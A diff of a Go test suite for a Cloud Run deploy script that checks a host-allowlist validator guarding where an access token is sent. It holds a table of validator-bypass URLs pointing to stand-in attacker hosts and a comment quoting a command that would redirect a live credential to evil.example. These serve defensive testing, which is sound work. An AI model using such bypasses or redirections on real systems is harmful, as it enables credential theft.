@@ -42,6 +42,22 @@ func deployScriptPath(t *testing.T) string {
 	return filepath.Join(repoRoot(t), "scripts", "single-node", "deploy.sh")
 }
 
+// scrubbedEnv returns the caller's environment with deploy.sh's test-only
+// seams removed. Without this, a developer with _DI_API_BASE exported in their
+// shell would silently redirect the script under test, and any assertion about
+// a DEFAULT endpoint would be defeatable by an ambient variable. Tests that
+// want a seam set do it explicitly, as a shell assignment in the setup prelude.
+func scrubbedEnv() []string {
+	var out []string
+	for _, kv := range os.Environ() {
+		if strings.HasPrefix(kv, "_DI_") {
+			continue
+		}
+		out = append(out, kv)
+	}
+	return out
+}
+
 // runBashFunc sources deploy.sh and calls the named function with args.
 // Returns stdout, stderr, and the exit code.
 func runBashFunc(t *testing.T, funcName string, args ...string) (string, string, int) {
@@ -58,6 +74,7 @@ func runBashFunc(t *testing.T, funcName string, args ...string) (string, string,
 	}
 
 	cmd := exec.Command("bash", "-c", bashCmd)
+	cmd.Env = scrubbedEnv()
 	var stdout, stderr strings.Builder
 	cmd.Stdout = &stdout
 	cmd.Stderr = &stderr
@@ -92,6 +109,7 @@ func runBashFuncWithSetup(t *testing.T, setup, funcName string, args ...string) 
 	}
 
 	cmd := exec.Command("bash", "-c", bashCmd)
+	cmd.Env = scrubbedEnv()
 	var stdout, stderr strings.Builder
 	cmd.Stdout = &stdout
 	cmd.Stderr = &stderr
@@ -208,11 +226,24 @@ func stubTokeninfoURL(serverURL string) string {
 	return serverURL + "/tokeninfo"
 }
 
-// preflightSetup composes the bash prelude for a preflight test: the gcloud
-// stub, plus both test-only URL seams pointed at the stub server.
+// preflightSetup composes the bash prelude for a di_main-level test: the
+// gcloud stub, plus both test-only URL seams set so di_main resolves them.
+// Only di_main reads these variables; every function below it takes the
+// endpoints as parameters. These two assignments are therefore the only place
+// the environment seam itself is exercised, which is deliberate.
 func preflightSetup(gcloudStub, serverURL string) string {
 	return fmt.Sprintf("%s\n_DI_API_BASE=%q\n_DI_TOKENINFO_URL=%q",
 		gcloudStub, serverURL, stubTokeninfoURL(serverURL))
+}
+
+// preflightArgs builds the argument list for a DIRECT call to
+// di_preflight_rest_credential. The API base and tokeninfo URL are its last
+// two parameters; the function reads no environment at all.
+func preflightArgs(gcloudAccount, serverURL string) []string {
+	return []string{
+		gcloudAccount, "us-east4", "test-project",
+		serverURL, stubTokeninfoURL(serverURL),
+	}
 }
 
 func TestScriptPreflightFailsWithoutADC(t *testing.T) {
@@ -222,9 +253,9 @@ func TestScriptPreflightFailsWithoutADC(t *testing.T) {
 	argvLog := gcloudArgvLog(t)
 
 	_, stderr, exitCode := runBashFuncWithSetup(t,
-		preflightSetup(brokenADCGcloudStub(argvLog), server.URL),
+		brokenADCGcloudStub(argvLog),
 		"di_preflight_rest_credential",
-		"user@example.com", "us-east4", "test-project")
+		preflightArgs("user@example.com", server.URL)...)
 
 	assert.NotEqual(t, 0, exitCode, "must fail when ADC is unavailable")
 	assert.Contains(t, stderr, "gcloud auth application-default login",
@@ -247,9 +278,9 @@ func TestScriptPreflightAbortsOnNon2xxGet(t *testing.T) {
 	argvLog := gcloudArgvLog(t)
 
 	_, stderr, exitCode := runBashFuncWithSetup(t,
-		preflightSetup(adcGcloudStub(argvLog), server.URL),
+		adcGcloudStub(argvLog),
 		"di_preflight_rest_credential",
-		"user@example.com", "us-east4", "test-project")
+		preflightArgs("user@example.com", server.URL)...)
 
 	assert.NotEqual(t, 0, exitCode,
 		"must fail when validating GET returns non-2xx — this abort prevents "+
@@ -273,9 +304,9 @@ func TestScriptPreflightWarnsOnIdentityMismatch(t *testing.T) {
 	argvLog := gcloudArgvLog(t)
 
 	_, stderr, exitCode := runBashFuncWithSetup(t,
-		preflightSetup(adcGcloudStub(argvLog), server.URL),
+		adcGcloudStub(argvLog),
 		"di_preflight_rest_credential",
-		"gcloud-user@example.com", "us-east4", "test-project")
+		preflightArgs("gcloud-user@example.com", server.URL)...)
 
 	assert.Equal(t, 0, exitCode,
 		"identity mismatch is a warning, not a failure — a deliberate mismatch "+
@@ -306,9 +337,9 @@ func TestScriptPreflightSkipsComparisonWhenTokeninfoOmitsEmail(t *testing.T) {
 	argvLog := gcloudArgvLog(t)
 
 	stdout, stderr, exitCode := runBashFuncWithSetup(t,
-		preflightSetup(adcGcloudStub(argvLog), server.URL),
+		adcGcloudStub(argvLog),
 		"di_preflight_rest_credential",
-		"operator@example.com", "us-east4", "test-project")
+		preflightArgs("operator@example.com", server.URL)...)
 
 	assert.Equal(t, 0, exitCode, "must succeed; stderr: %s", stderr)
 	assert.NotContains(t, stderr, "WARNING",
@@ -328,9 +359,9 @@ func TestScriptPreflightSucceedsWithMatchingIdentity(t *testing.T) {
 	argvLog := gcloudArgvLog(t)
 
 	stdout, stderr, exitCode := runBashFuncWithSetup(t,
-		preflightSetup(adcGcloudStub(argvLog), server.URL),
+		adcGcloudStub(argvLog),
 		"di_preflight_rest_credential",
-		"user@example.com", "us-east4", "test-project")
+		preflightArgs("user@example.com", server.URL)...)
 
 	assert.Equal(t, 0, exitCode, "must succeed when all checks pass; stderr: %s", stderr)
 	assert.NotContains(t, stderr, "WARNING",
@@ -344,48 +375,126 @@ func TestScriptPreflightSucceedsWithMatchingIdentity(t *testing.T) {
 		"the token must be minted from Application Default Credentials")
 }
 
-// TestScriptPreflightRejectsNonGoogleTokeninfoHost pins the narrowing of the
-// _DI_TOKENINFO_URL seam. The token reaches tokeninfo as a URL query
-// parameter, where the receiving host logs it, and the script is documented as
-// curl-able — so `_DI_TOKENINFO_URL=https://evil.example bash <(curl ...)` is a
+// ---------------------------------------------------------------------------
+// The host rule for the test-only URL seams
+//
+// di_validate_override_url is the newest and most security-sensitive function
+// in this script, and until review r2 it had NO direct test — it was reached
+// only through the preflight, with exactly one rejected input per seam. That
+// is precisely why a shallow bypass survived a mutation battery that caught
+// eight other defects: mutation testing proves the tests you have can detect
+// the defects you thought of, and says nothing about a function no test
+// addresses. Coverage of the caller is not coverage of the rule.
+//
+// So the rule gets a table, and the table is where new cases go.
+// ---------------------------------------------------------------------------
+
+// TestScriptValidateOverrideURL is the direct, table-driven test of the host
+// rule. The rejected rows are an evasion suite, not a formality: the `?` and
+// `#` rows are the live bypass found in review r2, where
+// `https://evil.example?.googleapis.com` passed the check and curl then
+// delivered `Authorization: Bearer <ADC token>` to evil.example, because curl
+// connects to the host before the `?`.
+func TestScriptValidateOverrideURL(t *testing.T) {
+	allowed := []struct{ name, url string }{
+		{"regional Cloud Run endpoint (the real default)", "https://us-east4-run.googleapis.com"},
+		{"tokeninfo endpoint (the real default)", "https://oauth2.googleapis.com/tokeninfo"},
+		{"loopback stub", "http://127.0.0.1:45607"},
+		{"loopback stub with a path", "http://127.0.0.1:45607/tokeninfo"},
+		{"localhost", "http://localhost:8080"},
+		{"IPv6 loopback with port and path", "http://[::1]:9000/x"},
+		{"uppercase host — hostnames are case-insensitive", "https://FOO.GOOGLEAPIS.COM"},
+	}
+	for _, tc := range allowed {
+		t.Run("allow/"+tc.name, func(t *testing.T) {
+			_, stderr, exitCode := runBashFunc(t, "di_validate_override_url", "_DI_API_BASE", tc.url)
+			assert.Equal(t, 0, exitCode,
+				"%q is a legitimate value and must be accepted; stderr: %s", tc.url, stderr)
+		})
+	}
+
+	rejected := []struct{ name, url string }{
+		// The r2 bypass. curl connects to the host before the '?' or '#'.
+		{"query suffix (r2 bypass)", "https://evil.example?.googleapis.com"},
+		{"fragment suffix (r2 bypass)", "https://evil.example#.googleapis.com"},
+		{"query suffix after a port", "https://evil.tld:8080?.googleapis.com"},
+		{"query parameter suffix", "https://evil.tld?x=.googleapis.com"},
+		{"backslash suffix", `https://evil.example\.googleapis.com`},
+		// Prefix/suffix confusion.
+		{"hyphen instead of dot", "https://evil-googleapis.com"},
+		{"googleapis.com as a subdomain label", "https://googleapis.com.evil.tld"},
+		{"path suffix", "https://evil.tld/x.googleapis.com"},
+		{"loopback as a subdomain label", "https://127.0.0.1.evil.tld"},
+		// Userinfo: curl resolves the host after the LAST '@'.
+		{"userinfo", "https://x@evil.tld"},
+		{"permitted host as userinfo", "https://foo.googleapis.com@evil.tld"},
+		{"userinfo with a colon and a port", "https://user:pass@evil.tld:8080"},
+		// Fail-closed, documented in review r2 Nit 5.
+		{"trailing-dot FQDN (fail-closed, known)", "https://oauth2.googleapis.com."},
+		{"plain attacker host", "https://evil.example"},
+	}
+	for _, tc := range rejected {
+		t.Run("reject/"+tc.name, func(t *testing.T) {
+			_, stderr, exitCode := runBashFunc(t, "di_validate_override_url", "_DI_API_BASE", tc.url)
+			require.NotEqual(t, 0, exitCode,
+				"%q must be REJECTED. An accepted value here means the ADC token is "+
+					"delivered to that host — as a Bearer header on the API base, and "+
+					"in a query string on tokeninfo, where the receiver logs it.", tc.url)
+			assert.Contains(t, stderr, "_DI_API_BASE",
+				"the rejection must name the variable at fault")
+		})
+	}
+}
+
+// TestScriptRejectsNonGoogleTokeninfoHost pins the _DI_TOKENINFO_URL seam at
+// the di_main level. The token reaches tokeninfo as a URL query parameter,
+// where the receiving host logs it, and the script is documented as curl-able
+// — so `_DI_TOKENINFO_URL=https://evil.example bash <(curl ...)` is a
 // plausible copy-paste accident that exfiltrates a live cloud-platform
-// credential. The override is restricted to Google's hosts or loopback.
-func TestScriptPreflightRejectsNonGoogleTokeninfoHost(t *testing.T) {
+// credential.
+//
+// This runs di_main, not the preflight, because di_main is now the only
+// reader of the variable. That makes the assertion stronger than it was: the
+// override is rejected before ANY side effect, so the gcloud stub records
+// nothing at all — not even the SDK capability probe that runs first.
+func TestScriptRejectsNonGoogleTokeninfoHost(t *testing.T) {
 	argvLog := gcloudArgvLog(t)
 	setup := fmt.Sprintf("%s\n_DI_API_BASE=%q\n_DI_TOKENINFO_URL=%q",
 		adcGcloudStub(argvLog),
-		"http://127.0.0.1:1", // never reached
+		"http://127.0.0.1:1", // permitted; never reached
 		"https://evil.example/tokeninfo")
 
-	_, stderr, exitCode := runBashFuncWithSetup(t, setup,
-		"di_preflight_rest_credential",
-		"user@example.com", "us-east4", "test-project")
+	_, stderr, exitCode := runBashFuncWithSetup(t, setup, "di_main",
+		"--name", "test-name", "--project", "test-project",
+		"--image", "ghcr.io/example/scion-omni:latest", "--region", "us-east4")
 
 	assert.NotEqual(t, 0, exitCode,
 		"must refuse to send an access token to a host outside googleapis.com")
 	assert.Contains(t, stderr, "evil.example",
 		"the rejection must name the offending host")
+	assert.Contains(t, stderr, "_DI_TOKENINFO_URL",
+		"the rejection must name the variable at fault")
 	assert.NoFileExists(t, argvLog,
-		"the check must run BEFORE the token is minted — no token should exist "+
-			"to leak in the first place")
+		"the check must run before ANY side effect — no gcloud call, no token, "+
+			"nothing to leak and no Instance to strand")
 }
 
-// TestScriptPreflightRejectsNonGoogleAPIBase pins the same restriction on the
-// other seam. _DI_API_BASE was originally left unrestricted on the grounds
-// that it only redirects a Bearer header on a read. That premise no longer
-// holds: di_build_iap_patch_url honours it too, so the seam now spans the step
-// 3b PATCH — a mutating call. Both seams carry the ADC token, so both live
-// under one rule.
-func TestScriptPreflightRejectsNonGoogleAPIBase(t *testing.T) {
+// TestScriptRejectsNonGoogleAPIBase is the same pin on the other seam.
+// _DI_API_BASE was originally unrestricted on the grounds that it only
+// redirected a Bearer header on a read. That premise died when the seam was
+// extended to the step 3b PATCH: a redirected base does not merely make the
+// preflight lie, it no-ops the security-critical mutation and leaves a created
+// Instance with IAP off. Both seams carry the token; both live under one rule.
+func TestScriptRejectsNonGoogleAPIBase(t *testing.T) {
 	argvLog := gcloudArgvLog(t)
 	setup := fmt.Sprintf("%s\n_DI_API_BASE=%q\n_DI_TOKENINFO_URL=%q",
 		adcGcloudStub(argvLog),
 		"https://evil.example",
 		"https://oauth2.googleapis.com/tokeninfo") // permitted; never reached
 
-	_, stderr, exitCode := runBashFuncWithSetup(t, setup,
-		"di_preflight_rest_credential",
-		"user@example.com", "us-east4", "test-project")
+	_, stderr, exitCode := runBashFuncWithSetup(t, setup, "di_main",
+		"--name", "test-name", "--project", "test-project",
+		"--image", "ghcr.io/example/scion-omni:latest", "--region", "us-east4")
 
 	assert.NotEqual(t, 0, exitCode,
 		"must refuse to send an access token to a host outside googleapis.com")
@@ -395,8 +504,41 @@ func TestScriptPreflightRejectsNonGoogleAPIBase(t *testing.T) {
 		"the rejection must name the variable at fault — with two seams under "+
 			"one rule, a message that does not say which one is a scavenger hunt")
 	assert.NoFileExists(t, argvLog,
-		"the check must run BEFORE the token is minted, and before step 3a "+
-			"creates an Instance that step 3b could not then configure")
+		"the check must run before ANY side effect — no gcloud call, no token, "+
+			"and no Instance that step 3b could not then configure")
+}
+
+// TestScriptSeamsAreReadInExactlyOnePlace pins the half of the invariant that
+// hoisting the resolution into di_main was supposed to buy, and which hoisting
+// alone does NOT enforce: "nothing reads a seam without having been validated."
+//
+// Passing the endpoints as parameters makes an unvalidated value visible at
+// the call site rather than invisible in the environment — but a future
+// function could still add its own ${_DI_API_BASE:-...} read and silently
+// reacquire the at-a-distance problem that review r2 flagged. Nothing else
+// would fail. So the count is pinned directly: each variable is read in
+// exactly one resolver, and each resolver is called exactly once.
+func TestScriptSeamsAreReadInExactlyOnePlace(t *testing.T) {
+	script := readDeployScript(t)
+
+	for _, seam := range []struct{ variable, resolver string }{
+		{"_DI_API_BASE", "di_resolve_api_base"},
+		{"_DI_TOKENINFO_URL", "di_resolve_tokeninfo_url"},
+	} {
+		t.Run(seam.variable, func(t *testing.T) {
+			reads := regexp.MustCompile(`\$\{`+seam.variable+`:?-`).FindAllString(script, -1)
+			assert.Len(t, reads, 1,
+				"%s must be read in exactly one place (%s). A second reader is how "+
+					"the validation gets orphaned: it would be resolved somewhere that "+
+					"di_main's check cannot see, and no existing test would fail.",
+				seam.variable, seam.resolver)
+
+			calls := regexp.MustCompile(`(?m)^\s*\w+="\$\(`+seam.resolver+`\b`).FindAllString(script, -1)
+			assert.Len(t, calls, 1,
+				"%s must be called exactly once, in di_main, with the validation "+
+					"immediately after it", seam.resolver)
+		})
+	}
 }
 
 // ---------------------------------------------------------------------------
@@ -775,7 +917,8 @@ func TestScriptEnableIAPPatchBody(t *testing.T) {
 
 func TestScriptEnableIAPUpdateMask(t *testing.T) {
 	// Verify the PATCH URL contains the correct updateMask.
-	stdout, _, exitCode := runBashFunc(t, "di_build_iap_patch_url", "us-east4", "my-project", "my-instance")
+	stdout, _, exitCode := runBashFunc(t, "di_build_iap_patch_url",
+		"https://us-east4-run.googleapis.com", "us-east4", "my-project", "my-instance")
 	require.Equal(t, 0, exitCode)
 
 	url := strings.TrimSpace(stdout)
@@ -785,6 +928,42 @@ func TestScriptEnableIAPUpdateMask(t *testing.T) {
 		"updateMask must include iapEnabled")
 	assert.Contains(t, url, "invokerIamDisabled",
 		"updateMask must include invokerIamDisabled")
+}
+
+// TestScriptDefaultAPIBaseIsTheRegionalEndpoint pins the DEFAULT endpoint —
+// the value every real deploy uses and no other test touches. Review r2 found
+// that dropping "-run" from it (https://run.googleapis.com) left the entire
+// suite green: TestScriptEnableIAPUpdateMask was the only test of the PATCH
+// URL and it asserts on the updateMask alone, never the host. The global
+// run.googleapis.com host does not serve these v2 instance paths, so that
+// mutation breaks every deploy and no test notices.
+//
+// The gap is pre-existing, but the base is now an environment-dependent
+// expression rather than a literal, which is exactly when a default-branch pin
+// starts earning its keep. runBashFunc scrubs _DI_* from the child environment
+// (see scrubbedEnv), so an ambient override cannot defeat this.
+func TestScriptDefaultAPIBaseIsTheRegionalEndpoint(t *testing.T) {
+	stdout, stderr, exitCode := runBashFunc(t, "di_resolve_api_base", "us-east4")
+	require.Equal(t, 0, exitCode, "stderr: %s", stderr)
+
+	assert.Equal(t, "https://us-east4-run.googleapis.com", strings.TrimSpace(stdout),
+		"the default API base must be the REGIONAL Cloud Run endpoint. The global "+
+			"host does not serve /v2/projects/*/locations/*/instances, so a deploy "+
+			"against it fails at the preflight GET and at the step 3b PATCH.")
+
+	// And the region really is interpolated, not hardcoded.
+	stdout, _, exitCode = runBashFunc(t, "di_resolve_api_base", "europe-west1")
+	require.Equal(t, 0, exitCode)
+	assert.Equal(t, "https://europe-west1-run.googleapis.com", strings.TrimSpace(stdout),
+		"the API base must follow --region")
+}
+
+// TestScriptDefaultTokeninfoURL pins the other default for the same reason.
+func TestScriptDefaultTokeninfoURL(t *testing.T) {
+	stdout, stderr, exitCode := runBashFunc(t, "di_resolve_tokeninfo_url")
+	require.Equal(t, 0, exitCode, "stderr: %s", stderr)
+	assert.Equal(t, "https://oauth2.googleapis.com/tokeninfo", strings.TrimSpace(stdout),
+		"the default tokeninfo endpoint must be Google's")
 }
 
 // ---------------------------------------------------------------------------
